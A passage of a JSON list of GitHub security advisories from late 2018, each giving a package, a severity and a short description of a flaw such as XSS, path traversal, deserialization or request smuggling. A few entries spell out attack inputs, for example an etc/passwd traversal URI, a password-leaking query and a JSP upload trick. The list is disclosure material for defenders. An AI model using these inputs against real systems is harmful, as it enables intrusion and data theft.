    "publishedAt": "2018-11-06T23:12:49Z",
    "description": "The validator package before 2.0.0 for Node.js allows remote attackers to bypass the cross-site scripting (XSS) filter via hex-encoded characters.",
    "summary": "Moderate severity vulnerability that affects validator"
  },
  {
    "ghsaId": "GHSA-vcr5-xr9h-mvc5",
    "publishedAt": "2018-11-06T23:12:48Z",
    "description": "python-gnupg 0.3.5 and 0.3.6 allows context-dependent attackers to have an unspecified impact via vectors related to \"option injection through positional arguments.\" NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-7323.",
    "summary": "Moderate severity vulnerability that affects python-gnupg"
  },
  {
    "ghsaId": "GHSA-23xp-j737-282v",
    "publishedAt": "2018-11-06T23:12:30Z",
    "description": "A path traversal in takeapeek module versions <=0.2.2 allows an attacker to list directory and files.",
    "summary": "Moderate severity vulnerability that affects takeapeek"
  },
  {
    "ghsaId": "GHSA-vgrx-w6rg-8fqf",
    "publishedAt": "2018-11-06T23:12:07Z",
    "description": "Since \"algorithm\" isn't enforced in jwt.decode()in jwt-simple 0.3.0 and earlier, a malicious user could choose what algorithm is sent sent to the server. If the server is expecting RSA but is sent HMAC-SHA with RSA's public key, the server will think the public key is actually an HMAC private key. This could be used to forge any data an attacker wants.",
    "summary": "Moderate severity vulnerability that affects jwt-simple"
  },
  {
    "ghsaId": "GHSA-jhgp-hvj6-x2p2",
    "publishedAt": "2018-11-06T23:12:01Z",
    "description": "A stored xss in tianma-static module versions <=1.0.4 allows an attacker to execute arbitrary javascript.",
    "summary": "High severity vulnerability that affects tianma-static"
  },
  {
    "ghsaId": "GHSA-3hvm-hgpw-rx4j",
    "publishedAt": "2018-11-06T23:11:10Z",
    "description": "A Path Traversal in Knightjs versions <= 0.0.1 allows an attacker to read content of arbitrary files on a remote server.",
    "summary": "Moderate severity vulnerability that affects knightjs"
  },
  {
    "ghsaId": "GHSA-7g2w-6r25-2j7p",
    "publishedAt": "2018-11-01T14:51:33Z",
    "description": "A command injection vulnerability in libnmap package for versions <0.4.16 allows arbitrary commands to be executed via arguments to the range options.",
    "summary": "High severity vulnerability that affects libnmap"
  },
  {
    "ghsaId": "GHSA-j7c4-2xj8-wm7r",
    "publishedAt": "2018-11-01T14:49:30Z",
    "description": "python-kdcproxy before 0.3.2 allows remote attackers to cause a denial of service via a large POST request.",
    "summary": "Moderate severity vulnerability that affects kdcproxy"
  },
  {
    "ghsaId": "GHSA-9jm3-5835-537m",
    "publishedAt": "2018-11-01T14:48:50Z",
    "description": "A command injection vulnerability in the apex-publish-static-files npm module version <2.0.1 which allows arbitrary shell command execution through a maliciously crafted argument.",
    "summary": "Moderate severity vulnerability that affects apex-publish-static-files"
  },
  {
    "ghsaId": "GHSA-c7c7-xm8g-xm36",
    "publishedAt": "2018-11-01T14:48:29Z",
    "description": "An issue was discovered in com\\mingsoft\\basic\\action\\web\\FileAction.java in MCMS 4.6.5. Since the upload interface does not verify the user login status, you can use this interface to upload files without setting a cookie. First, start an upload of JSP code with a .png filename, and then intercept the data packet. In the name parameter, change the suffix to jsp. In the response, the server returns the storage path of the file, which can be accessed to execute arbitrary JSP code.",
    "summary": "Moderate severity vulnerability that affects net.mingsoft:ms-mcms"
  },
  {
    "ghsaId": "GHSA-mwcv-m549-5cm8",
    "publishedAt": "2018-11-01T14:47:43Z",
    "description": "node-tkinter was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects node-tkinter"
  },
  {
    "ghsaId": "GHSA-rwg6-3fmj-w4wx",
    "publishedAt": "2018-11-01T14:47:21Z",
    "description": "tkinter was a malicious module published with the intent to hijack environment variables. It has been unpublished by npm.",
    "summary": "Moderate severity vulnerability that affects tkinter"
  },
  {
    "ghsaId": "GHSA-7hjp-97g3-rq93",
    "publishedAt": "2018-11-01T14:47:04Z",
    "description": "An issue was discovered in com\\mingsoft\\cms\\action\\GeneraterAction.java in MCMS 4.6.5. An attacker can write a .jsp file (in the position parameter) to an arbitrary directory via a ../ Directory Traversal in the url parameter.",
    "summary": "Moderate severity vulnerability that affects net.mingsoft:ms-mcms"
  },
  {
    "ghsaId": "GHSA-g4xq-jx4w-4cjv",
    "publishedAt": "2018-11-01T14:46:01Z",
    "description": "In the Loofah gem for Ruby, through version 2.2.2, unsanitized JavaScript may occur in sanitized output when a crafted SVG element is republished. Users are advised to upgrade to version 2.2.3.\r\n\r\nSee https://github.com/flavorjones/loofah/issues/154 for more details.",
    "summary": "Moderate severity vulnerability that affects loofah"
  },
  {
    "ghsaId": "GHSA-f9cm-qmx5-m98h",
    "publishedAt": "2018-11-01T14:45:42Z",
    "description": "The `merge.recursive` function in the `merge` package in versions before 1.2.1 can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects allowing for a denial of service attack.",
    "summary": "High severity vulnerability that affects merge"
  },
  {
    "ghsaId": "GHSA-hvwm-2624-rp9x",
    "publishedAt": "2018-10-30T20:48:58Z",
    "description": "An instance of a cross-site scripting vulnerability was identified to be present in the web based administration console on the queue.jsp page of Apache ActiveMQ versions 5.0.0 to 5.15.5. The root cause of this issue is improper data filtering of the QueueFilter parameter.",
    "summary": "Moderate severity vulnerability that affects org.apache.activemq:activemq-web-console"
  },
  {
    "ghsaId": "GHSA-37q6-576q-vgr7",
    "publishedAt": "2018-10-30T20:36:53Z",
    "description": "An issue was discovered in HMRServer.js in Parcel parcel-bundler. Attackers are able to steal developer's code because the origin of requests is not checked by the WebSocket server, which is used for HMR (Hot Module Replacement). Anyone can receive the HMR message sent by the WebSocket server via a ws://127.0.0.1 connection (with a random TCP port number) from any origin. The random port number can be found by connecting to http://127.0.0.1 and reading the \"new WebSocket\" line in the source code.",
    "summary": "High severity vulnerability that affects parcel-bundler"
  },
  {
    "ghsaId": "GHSA-6j63-35hj-vmcg",
    "publishedAt": "2018-10-30T20:34:06Z",
    "description": "mysql-binuuid-rails 1.1.0 and earlier allows SQL Injection because it removes default string escaping for affected database columns.",
    "summary": "Moderate severity vulnerability that affects mysql-binuuid-rails"
  },
  {
    "ghsaId": "GHSA-x84v-xcm2-53pg",
    "publishedAt": "2018-10-29T19:06:46Z",
    "description": "The Requests package through 2.19.1 before 2018-09-14 for Python sends an HTTP Authorization header to an http URI upon receiving a same-hostname https-to-http redirect, which makes it easier for remote attackers to discover credentials by sniffing the network.",
    "summary": "Moderate severity vulnerability that affects requests"
  },
  {
    "ghsaId": "GHSA-cf3c-fffp-34qh",
    "publishedAt": "2018-10-29T19:05:38Z",
    "description": "In conference-scheduler-cli, a pickle.load call on imported data allows remote attackers to execute arbitrary code via a crafted .pickle file, as demonstrated by Python code that contains an os.system call.",
    "summary": "High severity vulnerability that affects conference-scheduler-cli"
  },
  {
    "ghsaId": "GHSA-7fm6-2qw4-g3x3",
    "publishedAt": "2018-10-24T19:46:20Z",
    "description": "An issue was discovered in Pippo 1.11.0. The function SerializationSessionDataTranscoder.decode() calls ObjectInputStream.readObject() to deserialize a SessionData object without checking the object types. An attacker can create a malicious object, base64 encode it, and place it in the PIPPO_SESSION field of a cookie. Sending this cookie may lead to remote code execution.",
    "summary": "High severity vulnerability that affects ro.pippo:pippo-core"
  },
  {
    "ghsaId": "GHSA-xjrr-xv9m-4pw5",
    "publishedAt": "2018-10-24T19:42:03Z",
    "description": "parseObject in Fastjson before 1.2.25, as used in FastjsonEngine in Pippo 1.11.0 and other products, allows remote attackers to execute arbitrary code via a crafted JSON request, as demonstrated by a crafted rmi:// URI in the dataSourceName field of HTTP POST data to the Pippo /json URI, which is mishandled in AjaxApplication.java.",
    "summary": "High severity vulnerability that affects com.alibaba:fastjson"
  },
  {
    "ghsaId": "GHSA-gpvr-g6gh-9mc2",
    "publishedAt": "2018-10-23T17:22:54Z",
    "description": "The Express web framework before 3.11 and 4.x before 4.5 for Node.js does not provide a charset field in HTTP Content-Type headers in 400 level responses, which might allow remote attackers to conduct cross-site scripting (XSS) attacks via characters in a non-standard encoding.",
    "summary": "Moderate severity vulnerability that affects express"
  },
  {
    "ghsaId": "GHSA-9prh-257w-9277",
    "publishedAt": "2018-10-23T17:20:12Z",
    "description": "The handlebars package before 4.0.0 for Node.js allows remote attackers to conduct cross-site scripting (XSS) attacks by leveraging a template with an attribute that is not quoted.",
    "summary": "Moderate severity vulnerability that affects handlebars"
  },
  {
    "ghsaId": "GHSA-cgjx-mwpx-47jv",
    "publishedAt": "2018-10-23T17:14:57Z",
    "description": "express-restify-mongoose is a module to easily create a flexible REST interface for mongoose models. express-restify-mongoose 2.4.2 and earlier and 3.0.X through 3.0.1 allows a malicious user to send a request for `GET /User?distinct=password` and get all the passwords for all the users in the database, despite the field being set to private. This can be used for other private data if the malicious user knew what was set as private for specific routes.",
    "summary": "High severity vulnerability that affects express-restify-mongoose"
  },
  {
    "ghsaId": "GHSA-8q89-pwhh-7wfq",
    "publishedAt": "2018-10-23T16:08:56Z",
    "description": "text/impl/DefaultTextCreator.java, text/impl/ChineseTextProducer.java, and text/impl/FiveLetterFirstNameTextCreator.java in kaptcha 2.3.2 use the Random (rather than SecureRandom) function for generating CAPTCHA values, which makes it easier for remote attackers to bypass intended access restrictions via a brute-force approach.",
    "summary": "Moderate severity vulnerability that affects com.github.penggle:kaptcha"
  },
  {
    "ghsaId": "GHSA-gfx6-ph4q-q54q",
    "publishedAt": "2018-10-22T20:53:02Z",
    "description": "Akka HTTP versions <= 10.0.5 Illegal Media Range in Accept Header Causes StackOverflowError Leading to Denial of Service",
    "summary": "Moderate severity vulnerability that affects com.typesafe.akka:akka-http-core_2.11 and com.typesafe.akka:akka-http-core_2.12"
  },
  {
    "ghsaId": "GHSA-mm57-9j6q-rxm2",
    "publishedAt": "2018-10-22T20:52:38Z",
    "description": "Akka versions <=2.4.16 and 2.5-M1 are vulnerable to a java deserialization attack in its Remoting component resulting in remote code execution in the context of the ActorSystem.",
    "summary": "High severity vulnerability that affects com.typesafe.akka:akka-actor_2.11 and com.typesafe.akka:akka-actor_2.12"
  },
  {
    "ghsaId": "GHSA-mr95-9rr4-668f",
    "publishedAt": "2018-10-22T20:44:26Z",
    "description": "Lightbend Akka 2.5.x before 2.5.16 allows message disclosure and modification because of an RNG error. A random number generator is used in Akka Remoting for TLS (both classic and Artery Remoting). Akka allows configuration of custom random number generators. For historical reasons, Akka included the AES128CounterSecureRNG and AES256CounterSecureRNG random number generators. The implementations had a bug that caused the generated numbers to be repeated after only a few bytes. The custom RNG implementations were not configured by default but examples in the documentation showed (and therefore implicitly recommended) using the custom ones. This can be used by an attacker to compromise the communication if these random number generators are enabled in configuration. It would be possible to eavesdrop, replay, or modify the messages sent with Akka Remoting/Cluster.",
    "summary": "High severity vulnerability that affects com.typesafe.akka:akka-actor_2.11 and com.typesafe.akka:akka-actor_2.12"
  },
  {
    "ghsaId": "GHSA-9qgc-p27w-3hjg",
    "publishedAt": "2018-10-22T20:37:07Z",
    "description": "The decodeRequest and decodeRequestWith directives in Lightbend Akka HTTP 10.1.x through 10.1.4 and 10.0.x through 10.0.13 allow remote attackers to cause a denial of service (memory consumption and daemon crash) via a ZIP bomb.",
    "summary": "High severity vulnerability that affects com.typesafe.akka:akka-http-core_2.11 and com.typesafe.akka:akka-http-core_2.12"
  },
  {
    "ghsaId": "GHSA-4cj8-g9cp-v5wr",
    "publishedAt": "2018-10-22T18:53:56Z",
    "description": "Unauthenticated arbitrary file upload vulnerability in Blueimp jQuery-File-Upload <= v9.22.0",
    "summary": "High severity vulnerability that affects blueimp-file-upload"
  },
  {
    "ghsaId": "GHSA-h8w4-qv99-f7vj",
    "publishedAt": "2018-10-19T22:00:28Z",
    "description": "Spring Security OAuth, versions 2.3 prior to 2.3.4, and 2.2 prior to 2.2.3, and 2.1 prior to 2.1.3, and 2.0 prior to 2.0.16, and older unsupported versions could be susceptible to a privilege escalation under certain conditions. A malicious user or attacker can craft a request to the approval endpoint that can modify the previously saved authorization request and lead to a privilege escalation on the subsequent approval. This scenario can happen if the application is configured to use a custom approval endpoint that declares AuthorizationRequest as a controller method argument. This vulnerability exposes applications that meet all of the following requirements: Act in the role of an Authorization Server (e.g. @EnableAuthorizationServer) and use a custom Approval Endpoint that declares AuthorizationRequest as a controller method argument. This vulnerability does not expose applications that: Act in the role of an Authorization Server and use the default Approval Endpoint, act in the role of a Resource Server only (e.g. @EnableResourceServer), act in the role of a Client only (e.g. @EnableOAuthClient).",
    "summary": "High severity vulnerability that affects org.springframework.security.oauth:spring-security-oauth2"
  },
  {
    "ghsaId": "GHSA-6cw8-7j6c-hccp",
    "publishedAt": "2018-10-19T17:43:36Z",
    "description": "In Eclipse Vert.x version 3.0 to 3.5.1, the HttpServer response headers and HttpClient request headers do not filter carriage return and line feed characters from the header value. This allow unfiltered values to inject a new header in the client request or server response.",
    "summary": "Moderate severity vulnerability that affects io.vertx:vertx-core"
  },
  {
    "ghsaId": "GHSA-76qr-mmh8-cp8f",
    "publishedAt": "2018-10-19T16:56:00Z",
    "description": "In Spark before 2.7.2, a remote attacker can read unintended static files via various representations of absolute or relative pathnames, as demonstrated by file: URLs and directory traversal sequences. NOTE: this product is unrelated to Ignite Realtime Spark.",
    "summary": "Moderate severity vulnerability that affects com.sparkjava:spark-core"
  },
  {
    "ghsaId": "GHSA-fmr4-w67p-vh8x",
    "publishedAt": "2018-10-19T16:55:35Z",
    "description": "A flaw was found in Wildfly 9.x. A path traversal vulnerability through the org.wildfly.extension.undertow.deployment.ServletResourceManager.getResource method could lead to information disclosure of arbitrary local files.",
    "summary": "Moderate severity vulnerability that affects org.wildfly:wildfly-undertow"
  },
  {
    "ghsaId": "GHSA-mcfm-h73v-635m",
    "publishedAt": "2018-10-19T16:55:14Z",
    "description": "It was discovered in Undertow that the code that parsed the HTTP request line permitted invalid characters. This could be exploited, in conjunction with a proxy that also permitted the invalid characters but with a different interpretation, to inject data into the HTTP response. By manipulating the HTTP response the attacker could poison a web-cache, perform an XSS attack, or obtain sensitive information from requests other than their own.",
    "summary": "High severity vulnerability that affects io.undertow:undertow-core"
  },
  {
    "ghsaId": "GHSA-3x7h-5hfr-hvjm",
    "publishedAt": "2018-10-19T16:54:56Z",
    "description": "It was found in Undertow before 1.3.28 that with non-clean TCP close, the Websocket server gets into infinite loop on every IO thread, effectively causing DoS.",
    "summary": "Moderate severity vulnerability that affects io.undertow:undertow-core"
  },
  {
    "ghsaId": "GHSA-6xq8-pvg4-3mf3",
    "publishedAt": "2018-10-19T16:54:11Z",
    "description": "Eclipse RDF4j version < 2.4.0 Milestone 2 contains a XML External Entity (XXE) vulnerability in RDF4j XML parser parsing RDF files that can result in the disclosure of confidential data, denial of service, server side request forgery, port scanning. This attack appear to be exploitable via Specially crafted RDF file.",
    "summary": "Moderate severity vulnerability that affects org.eclipse.rdf4j:rdf4j-runtime"
  },
  {
    "ghsaId": "GHSA-568q-9fw5-28wf",
    "publishedAt": "2018-10-19T16:53:33Z",
    "description": "A weakness was found in postgresql-jdbc before version 42.2.5. It was possible to provide an SSL Factory and not check the host name if a host name verifier was not provided to the driver. This could lead to a condition where a man-in-the-middle attacker could masquerade as a trusted server by providing a certificate for the wrong host, as long as it was signed by a trusted CA.",
    "summary": "Moderate severity vulnerability that affects org.postgresql:pgjdbc-aggregate"
  },
  {
    "ghsaId": "GHSA-4m9r-5gqp-7j82",
    "publishedAt": "2018-10-19T16:52:06Z",
    "description": "The XMLUI feature in DSpace before 3.6, 4.x before 4.5, and 5.x before 5.5 allows directory traversal via the themes/ path in an attack with two or more arbitrary characters and a colon before a pathname, as demonstrated by a themes/Reference/aa:etc/passwd URI.",
    "summary": "High severity vulnerability that affects org.dspace:dspace-xmlui"
  },
  {
    "ghsaId": "GHSA-h3wv-47xm-4mg6",
    "publishedAt": "2018-10-19T16:51:25Z",
    "description": "The SVG Salamander (aka svgSalamander) library, when used in a web application, allows remote attackers to conduct server-side request forgery (SSRF) attacks via an xlink:href attribute in an SVG file.",
    "summary": "Moderate severity vulnerability that affects com.kitfox.svg:svg-salamander"
  },
  {
    "ghsaId": "GHSA-qvxv-pmq9-4q7g",
    "publishedAt": "2018-10-19T16:51:11Z",
    "description": "The compilation daemon in Scala before 2.10.7, 2.11.x before 2.11.12, and 2.12.x before 2.12.4 uses weak permissions for private files in /tmp/scala-devel/${USER:shared}/scalac-compile-server-port, which allows local users to write to arbitrary class files and consequently gain privileges.",
    "summary": "High severity vulnerability that affects org.scala-lang:scala-compiler"
  },
  {
    "ghsaId": "GHSA-93jq-624g-4p9p",
    "publishedAt": "2018-10-19T16:50:50Z",
    "description": "Async Http Client (aka async-http-client) before 2.0.35 can be tricked into connecting to a host different from the one extracted by java.net.URI if a '?' character occurs in a fragment identifier. Similar bugs were previously identified in cURL (CVE-2016-8624) and Oracle Java 8 java.net.URL.",
    "summary": "Moderate severity vulnerability that affects org.asynchttpclient:async-http-client"
  },
  {
    "ghsaId": "GHSA-g556-x5vx-qh59",
    "publishedAt": "2018-10-19T16:50:33Z",
    "description": "AndroidSVG version 1.2.2 is vulnerable to XXE attacks in the SVG parsing component resulting in denial of service and possibly remote code execution",
    "summary": "Moderate severity vulnerability that affects com.caverock:androidsvg"
  },
  {
    "ghsaId": "GHSA-q7pf-qr96-2vq5",
    "publishedAt": "2018-10-19T16:46:41Z",
    "description": "A vulnerability in Swagger-Parser's (version <= 1.0.30) yaml parsing functionality results in arbitrary code being executed when a maliciously crafted yaml Open-API specification is parsed. This in particular, affects the 'generate' and 'validate' command in swagger-codegen (<= 2.2.2) and can lead to arbitrary code being executed when these commands are used on a well-crafted yaml specification.",
    "summary": "Moderate severity vulnerability that affects io.swagger:swagger-codegen and io.swagger:swagger-parser"
  },
  {
    "ghsaId": "GHSA-vgvf-9jh3-fg75",
    "publishedAt": "2018-10-19T16:46:30Z",
    "description": "A vulnerability in Swagger-Parser's version <= 1.0.30 and Swagger codegen version <= 2.2.2 yaml parsing functionality results in arbitrary code being executed when a maliciously crafted yaml Open-API specification is parsed. This in particular, affects the 'generate' and 'validate' command in swagger-codegen (<= 2.2.2) and can lead to arbitrary code being executed when these commands are used on a well-crafted yaml specification.",
    "summary": "Moderate severity vulnerability that affects io.swagger:swagger-codegen and io.swagger:swagger-parser"
  },
  {
    "ghsaId": "GHSA-q25j-gcmv-5qpp",
    "publishedAt": "2018-10-19T16:46:01Z",
    "description": "Grails Fields plugin version 2.2.7 contains a Cross Site Scripting (XSS) vulnerability in Using the display tag that can result in XSS . This vulnerability appears to have been fixed in 2.2.8.",
    "summary": "Moderate severity vulnerability that affects org.grails.plugins:fields and org.grails:grails-core"
  },
  {
    "ghsaId": "GHSA-m9w8-v359-9ffr",
    "publishedAt": "2018-10-19T16:42:27Z",
    "description": "TLS hostname verification when using the Apache ActiveMQ Client before 5.15.6 was missing which could make the client vulnerable to a MITM attack between a Java application using the ActiveMQ client and the ActiveMQ server. This is now enabled by default.",
    "summary": "Moderate severity vulnerability that affects org.apache.activemq:activemq-client"
  },
  {
    "ghsaId": "GHSA-p99p-726h-c8v5",
    "publishedAt": "2018-10-19T16:42:15Z",
    "description": "In Apache jUDDI 3.2 through 3.3.4, if using the WADL2Java or WSDL2Java classes, which parse a local or remote XML document and then mediates the data structures into UDDI data structures, there are little protections present against entity expansion and DTD type of attacks. Mitigation is to use 3.3.5.",
    "summary": "Moderate severity vulnerability that affects org.apache.juddi:juddi-client"
  },
  {
    "ghsaId": "GHSA-6w3v-66mj-2qm6",
    "publishedAt": "2018-10-19T16:41:46Z",
    "description": "A Denial of Service vulnerability was found in Apache Qpid Broker-J 7.0.0 in functionality for authentication of connections for AMQP protocols 0-8, 0-9, 0-91 and 0-10 when PLAIN or XOAUTH2 SASL mechanism is used. The vulnerability allows unauthenticated attacker to crash the broker instance. AMQP 1.0 and HTTP connections are not affected. An authentication of incoming AMQP connections in Apache Qpid Broker-J is performed by special entities called \"Authentication Providers\". Each Authentication Provider can support several SASL mechanisms which are offered to the connecting clients as part of SASL negotiation process. The client chooses the most appropriate SASL mechanism for authentication. Authentication Providers of following types supports PLAIN SASL mechanism: Plain, PlainPasswordFile, SimpleLDAP, Base64MD5PasswordFile, MD5, SCRAM-SHA-256, SCRAM-SHA-1. XOAUTH2 SASL mechanism is supported by Authentication Providers of type OAuth2. If an AMQP port is configured with any of these Authentication Providers, the Broker may be vulnerable.",
    "summary": "Moderate severity vulnerability that affects org.apache.qpid:apache-qpid-broker-j"
  },
  {
    "ghsaId": "GHSA-hrmr-f5m6-m9pq",
    "publishedAt": "2018-10-19T16:41:27Z",
    "description": "When reading a specially crafted ZIP archive, the read method of Apache Commons Compress 1.7 to 1.17's ZipArchiveInputStream can fail to return the correct EOF indication after the end of the stream has been reached. When combined with a java.io.InputStreamReader this can lead to an infinite stream, which can be used to mount a denial of service attack against services that use Compress' zip package.",
    "summary": "Moderate severity vulnerability that affects org.apache.commons:commons-compress"
  },
  {
    "ghsaId": "GHSA-4r7g-7cpj-5jr7",
    "publishedAt": "2018-10-19T16:41:15Z",
    "description": "In Apache Qpid Broker-J versions 6.1.0 through 6.1.4 (inclusive) the broker does not properly enforce a maximum frame size in AMQP 1.0 frames. A remote unauthenticated attacker could exploit this to cause the broker to exhaust all available memory and eventually terminate.  Older AMQP protocols are not affected.",
    "summary": "Moderate severity vulnerability that affects org.apache.qpid:qpid-broker"
  },
  {
    "ghsaId": "GHSA-269m-695x-j34p",
    "publishedAt": "2018-10-19T16:41:04Z",
    "description": "In Apache Qpid Broker-J 0.18 through 0.32, if the broker is configured with different authentication providers on different ports one of which is an HTTP port, then the broker can be tricked by a remote unauthenticated attacker connecting to the HTTP port into using an authentication provider that was configured on a different port. The attacker still needs valid credentials with the authentication provider on the spoofed port. This becomes an issue when the spoofed port has weaker authentication protection (e.g., anonymous access, default accounts) and is normally protected by firewall rules or similar which can be circumvented by this vulnerability. AMQP ports are not affected. Versions 6.0.0 and newer are not affected.",
    "summary": "Moderate severity vulnerability that affects org.apache.qpid:qpid-broker"
  },
  {
    "ghsaId": "GHSA-jc7r-v6fg-2gpf",
    "publishedAt": "2018-10-19T16:40:01Z",
    "description": "It is possible to configure Apache CXF to use the com.sun.net.ssl implementation via 'System.setProperty(\"java.protocol.handler.pkgs\", \"com.sun.net.ssl.internal.www.protocol\");'. When this system property is set, CXF uses some reflection to try to make the HostnameVerifier work with the old com.sun.net.ssl.HostnameVerifier interface. However, the default HostnameVerifier implementation in CXF does not implement the method in this interface, and an exception is thrown. However, in Apache CXF prior to 3.2.5 and 3.1.16 the exception is caught in the reflection code and not properly propagated. What this means is that if you are using the com.sun.net.ssl stack with CXF, an error with TLS hostname verification will not be thrown, leaving a CXF client subject to man-in-the-middle attacks.",
    "summary": "High severity vulnerability that affects org.apache.cxf:apache-cxf, org.apache.cxf:apache-cxf , and org.apache.cxf:cxf"
  },
  {
    "ghsaId": "GHSA-qv32-7r6p-xhhh",
    "publishedAt": "2018-10-19T16:39:29Z",
    "description": "XMPCore in Adobe XMP Toolkit for Java before 5.1.3 allows remote attackers to read arbitrary files via XML data containing an external entity declaration in conjunction with an entity reference, related to an XML External Entity (XXE) issue.",
    "summary": "Moderate severity vulnerability that affects com.adobe.xmp:xmpcore"
  },
  {
    "ghsaId": "GHSA-6x9x-8qw9-9pp6",
    "publishedAt": "2018-10-19T16:16:38Z",
    "description": "In Eclipse Jetty Server, versions 9.2.x and older, 9.3.x (all non HTTP/1.x configurations), and 9.4.x (all HTTP/1.x configurations), when presented with two content-lengths headers, Jetty ignored the second. When presented with a content-length and a chunked encoding header, the content-length was ignored (as per RFC 2616). If an intermediary decided on the shorter length, but still passed on the longer body, then body content could be interpreted by Jetty as a pipelined request. If the intermediary was imposing authorization, the fake pipelined request would bypass that authorization.",
    "summary": "High severity vulnerability that affects org.eclipse.jetty:jetty-server"
  },
  {
    "ghsaId": "GHSA-84q7-p226-4x5w",
    "publishedAt": "2018-10-19T16:16:27Z",
    "description": "In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), HTTP/0.9 is handled poorly. An HTTP/1 style request line (i.e. method space URI space version) that declares a version of HTTP/0.9 was accepted and treated as a 0.9 request. If deployed behind an intermediary that also accepted and passed through the 0.9 version (but did not act on it), then the response sent could be interpreted by the intermediary as HTTP/1 headers. This could be used to poison the cache if the server allowed the origin client to generate arbitrary content in the response.",
    "summary": "Moderate severity vulnerability that affects org.eclipse.jetty:jetty-server"
  },
  {
    "ghsaId": "GHSA-872g-2h8h-362q",
    "publishedAt": "2018-10-19T16:16:16Z",
    "description": "The path normalization mechanism in PathResource class in Eclipse Jetty 9.3.x before 9.3.9 on Windows allows remote attackers to bypass protected resource restrictions and other security constraints via a URL with certain escaped characters, related to backslashes.",
    "summary": "High severity vulnerability that affects org.eclipse.jetty:jetty-server"
  },
  {
    "ghsaId": "GHSA-9rgv-h7x4-qw8g",
    "publishedAt": "2018-10-19T16:15:56Z",
    "description": "In Eclipse Jetty Server, all 9.x versions, on webapps deployed using default Error Handling, when an intentionally bad query arrives that doesn't match a dynamic url-pattern, and is eventually handled by the DefaultServlet's static file serving, the bad characters can trigger a java.nio.file.InvalidPathException which includes the full path to the base resource directory that the DefaultServlet and/or webapp is using. If this InvalidPathException is then handled by the default Error Handler, the InvalidPathException message is included in the error response, revealing the full server path to the requesting system.",
    "summary": "Moderate severity vulnerability that affects org.eclipse.jetty:jetty-server"
  },
  {
    "ghsaId": "GHSA-wfcc-pff6-rgc5",
    "publishedAt": "2018-10-19T16:15:46Z",
    "description": "Jetty through 9.4.x is prone to a timing channel in util/security/Password.java, which makes it easier for remote attackers to obtain access by observing elapsed times before rejection of incorrect passwords.",
    "summary": "Moderate severity vulnerability that affects org.eclipse.jetty:jetty-server"
  },
  {
    "ghsaId": "GHSA-vgg8-72f2-qm23",
    "publishedAt": "2018-10-19T16:15:34Z",
    "description": "In Eclipse Jetty, versions 9.2.x and older, 9.3.x, transfer-encoding chunks are handled poorly. The chunk length parsing was vulnerable to an integer overflow. Thus a large chunk size could be interpreted as a smaller chunk size and content sent as chunk body could be interpreted as a pipelined request. If Jetty was deployed behind an intermediary that imposed some authorization and that intermediary allowed arbitrarily large chunks to be passed on unchanged, then this flaw could be used to bypass the authorization imposed by the intermediary as the fake pipelined request would not be interpreted by the intermediary as a request.",
    "summary": "Critical severity vulnerability that affects org.eclipse.jetty:jetty-server"
  },
  {
    "ghsaId": "GHSA-cr6j-3jp9-rw65",
    "publishedAt": "2018-10-18T19:24:38Z",
    "description": "Apache Struts versions 2.3 to 2.3.34 and 2.5 to 2.5.16 suffer from possible Remote Code Execution when using results with no namespace and in same time, its upper action(s) have no or wildcard namespace. Same possibility when using url tag which doesn't have value and action set and in same time, its upper action(s) have no or wildcard namespace.",
    "summary": "Critical severity vulnerability that affects org.apache.struts:struts2-core"
  },
  {
    "ghsaId": "GHSA-j77q-2qqg-6989",
    "publishedAt": "2018-10-18T19:24:26Z",
    "description": "The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 has incorrect exception handling and error-message generation during file-upload attempts, which allows remote attackers to execute arbitrary commands via a crafted Content-Type, Content-Disposition, or Content-Length HTTP header, as exploited in the wild in March 2017 with a Content-Type header containing a #cmd= string.",
    "summary": "High severity vulnerability that affects org.apache.struts:struts2-core"
  },
  {
    "ghsaId": "GHSA-7q9c-h23x-65fq",
    "publishedAt": "2018-10-18T18:06:22Z",
    "description": "When processing authorization requests using the whitelabel views in Spring Security OAuth 2.0.0 to 2.0.9 and 1.0.0 to 1.0.5, the response_type parameter value was executed as Spring SpEL which enabled a malicious user to trigger remote code execution via the crafting of the value for response_type.",
    "summary": "Moderate severity vulnerability that affects org.springframework.security.oauth:spring-security-oauth2"
  },
  {
    "ghsaId": "GHSA-w4g2-9hj6-5472",
    "publishedAt": "2018-10-18T18:06:08Z",
    "description": "Pivotal Spring AMQP, 1.x versions prior to 1.7.10 and 2.x versions prior to 2.0.6, expose a man-in-the-middle vulnerability due to lack of hostname validation. A malicious user that has the ability to intercept traffic would be able to view data in transit.",
    "summary": "Moderate severity vulnerability that affects com.rabbitmq:amqp-client and org.springframework.amqp:spring-amqp"
  },
  {
    "ghsaId": "GHSA-xx65-cc7g-9pfp",
    "publishedAt": "2018-10-18T18:05:57Z",
    "description": "Spring Boot supports an embedded launch script that can be used to easily run the application as a systemd or init.d linux service. The script included with Spring Boot 1.5.9 and earlier and 2.0.0.M1 through 2.0.0.M7 is susceptible to a symlink attack which allows the \"run_user\" to overwrite and take ownership of any file on the same system. In order to instigate the attack, the application must be installed as a service and the \"run_user\" requires shell access to the server. Spring Boot application that are not installed as a service, or are not using the embedded launch script are not susceptible.",
    "summary": "Moderate severity vulnerability that affects org.springframework.boot:spring-boot"
  },
  {
    "ghsaId": "GHSA-m9jm-rhrm-gcxj",
    "publishedAt": "2018-10-18T18:05:46Z",
    "description": "Spring-integration-zip versions prior to 1.0.1 exposes an arbitrary file write vulnerability, which can be achieved using a specially crafted zip archive (affects other archives as well, bzip2, tar, xz, war, cpio, 7z) that holds path traversal filenames. So when the filename gets concatenated to the target extraction directory, the final path ends up outside of the target folder.",
    "summary": "High severity vulnerability that affects org.springframework.integration:spring-integration-zip"
  },
  {
    "ghsaId": "GHSA-rrpm-pj7p-7j9q",
    "publishedAt": "2018-10-18T18:05:34Z",
    "description": "Spring Security OAuth, versions 2.3 prior to 2.3.3, 2.2 prior to 2.2.2, 2.1 prior to 2.1.2, 2.0 prior to 2.0.15 and older unsupported versions contains a remote code execution vulnerability. A malicious user or attacker can craft an authorization request to the authorization endpoint that can lead to remote code execution when the resource owner is forwarded to the approval endpoint.",
    "summary": "High severity vulnerability that affects org.springframework.security.oauth:spring-security-oauth2"
  },
  {
